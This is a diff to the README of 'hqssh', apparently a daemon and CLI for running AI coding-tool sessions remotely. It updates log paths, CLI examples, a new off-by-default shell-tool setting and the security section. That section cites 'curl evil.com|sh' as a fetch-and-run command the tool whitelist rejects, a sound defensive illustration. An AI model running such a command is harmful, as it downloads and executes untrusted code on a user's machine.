@@ -122,7 +122,7 @@ The installer sets up a background service and `hqssh` manages it on both platfo
 | Start | `hqssh service start` | `launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.gelotto.hqsshd.plist` | `sudo launchctl bootstrap system /Library/LaunchDaemons/com.gelotto.hqsshd.plist` | `systemctl --user start hqsshd` |
 | Stop | `hqssh service stop` | `launchctl bootout gui/$(id -u)/com.gelotto.hqsshd` | `sudo launchctl bootout system/com.gelotto.hqsshd` | `systemctl --user stop hqsshd` |
 | Restart | `hqssh service restart` | `launchctl kickstart -k gui/$(id -u)/com.gelotto.hqsshd` | `sudo launchctl kickstart -k system/com.gelotto.hqsshd` | `systemctl --user restart hqsshd` |
-| Logs | `hqssh service logs -f` | `tail -f ~/.hqssh/logs/hqsshd.log` | same | `journalctl --user -u hqsshd -f` |
+| Logs | `hqssh service logs -f` | `tail -f ~/.hqssh/logs/hqsshd.log` | `tail -f /Library/Logs/hqsshd/hqsshd.log` | `journalctl --user -u hqsshd -f` |
 
 `hqssh doctor` runs without a daemon and checks the binaries, the service, the Unix socket, the TCP port the mobile app uses, configuration, logs and the data directory; every failed check prints the command that fixes it, and the exit status is `1` when anything failed (`--quiet` for scripts, `--json` for tooling).
 
@@ -191,7 +191,13 @@ hqssh sessions -H myserver.com -u myuser
 # Attach to a session
 hqssh attach <session-id> -H myserver.com -u myuser
 
-# Detach from session: Ctrl+B, then D
+# Detach: Ctrl+B, then d (every other key, including Ctrl+C, goes to the session)
+
+# Start a new session (first detected AI tool unless --tool is given)
+hqssh new -H myserver.com
+
+# A daemon listening on a non-default tcp_port
+hqssh sessions -H myserver.com --daemon-port 50052   # or daemon_port: in ~/.hqssh/config.yaml
 ```
 
 **SSH Authentication:**
@@ -230,9 +236,17 @@ sessions:
 events:
   webhook_url: ""           # Empty = disabled
 
+# The built-in "shell" tool runs arbitrary commands as your user. It is
+# off by default; sessions and tasks that ask for "shell" are refused with
+# InvalidArgument until this is set (the app and the CLI default to an AI
+# tool instead).
+enable_shell_tool: false
+
 # Debugging only: expose the gRPC schema to grpcurl (off by default)
 enable_reflection: false
 ```
+
+`sessions.history_size` is an estimate in lines (about 100 bytes each); set `sessions.max_scrollback_size` (bytes) to control the buffer exactly, it takes precedence when both are present.
 
 The daemon reads the file at startup; restart it after editing (`hqssh service restart`).
 
@@ -254,7 +268,7 @@ Start with `hqssh doctor`. The situations below are the ones it diagnoses most o
 
 **Stale `/tmp/hqssh.sock`.** After a SIGKILL or crash the socket file survives; the next start detects that nothing listens on it and removes it (`removing stale socket` in the log). `hqssh` reports "socket exists but nothing is listening" instead of a raw gRPC error. Remove it by hand only when no `hqsshd` process exists.
 
-**Logs.** macOS: `~/.hqssh/logs/hqsshd.log` (launchd's stdout/stderr; rotated to `.1`–`.3` by the installer on upgrade when larger than 5 MB). Linux: `journalctl --user -u hqsshd`. `hqssh service logs -f` follows either. `hqsshd --log-level debug` (or `log.level` in the config) adds detail. When the daemon fails to start, the reason is the last `level=ERROR` line — `hqssh doctor` prints the tail when anything fails.
+**Logs.** macOS: `~/.hqssh/logs/hqsshd.log` for the user agent, `/Library/Logs/hqsshd/hqsshd.log` for the system daemon (launchd's stdout/stderr; rotated to `.1`–`.3` by the installer on upgrade when larger than 5 MB). Linux: `journalctl --user -u hqsshd`. `hqssh service logs -f` follows either. `hqsshd --log-level debug` (or `log.level` in the config) adds detail. When the daemon fails to start, the reason is the last `level=ERROR` line — `hqssh doctor` prints the tail when anything fails.
 
 **Project discovery skips `~/Desktop`, `~/Documents`, `~/Downloads` (macOS).** Those folders are protected by TCC. Grant `hqsshd` Full Disk Access (System Settings › Privacy & Security › Full Disk Access; the installer signs the binary as `com.gelotto.hqsshd`, which is how it appears there), or keep projects elsewhere. On a headless Mac the login keychain stays locked until a GUI login, so tools that read credentials from it (Claude Code) may need one login after each reboot.
 
@@ -293,7 +307,7 @@ auth_token: "generate-a-long-random-string-here"
 
 Even without gRPC-layer authentication, hqsshd applies input validation to limit blast radius:
 
-- **Tool whitelist** - Session and task creation only accept tool names from `daemon.yaml` config (e.g., `claude`, `codex`, `aider`, `shell`). Arbitrary commands like `curl evil.com|sh` are rejected.
+- **Tool whitelist** - Session and task creation only accept tool names from `daemon.yaml` config (`claude`, `codex`, `aider` by default). The built-in `shell` tool runs arbitrary commands and is refused unless `enable_shell_tool: true` is set. Arbitrary commands like `curl evil.com|sh` are rejected.
 - **Prompt injection prevention** - AI tool prompts are passed as shell positional arguments (`$1`), never interpolated into shell command strings.
 - **Path traversal protection** - Session log access validates that session IDs cannot escape the log directory.
 
@@ -359,11 +373,11 @@ All data is stored in `~/.hqssh/`:
 | `daemon.yaml` | Configuration (optional) |
 | `projects.json` | Registered projects |
 | `discovery.json` | Learned scan roots and removed-project tombstones |
-| `sessions.json` | Session records (for history and re-attach after restart) |
+| `sessions.json` | Session records for the history view. Sessions do not survive a daemon restart (see Service Management) |
 | `tasks.json` | Task definitions |
 | `task_runs.json` | Task execution history |
 | `hqsshd.pid` | Pid of the running daemon, locked with `flock` while it runs (removed on clean exit) |
-| `logs/hqsshd.log` | Daemon log under launchd (macOS); Linux logs to journald |
+| `logs/hqsshd.log` | Daemon log under a launchd user agent (macOS); the system daemon logs to `/Library/Logs/hqsshd/hqsshd.log`; Linux logs to journald |
 | `logs/sessions/` | Per-session terminal logs |
 
 ## License
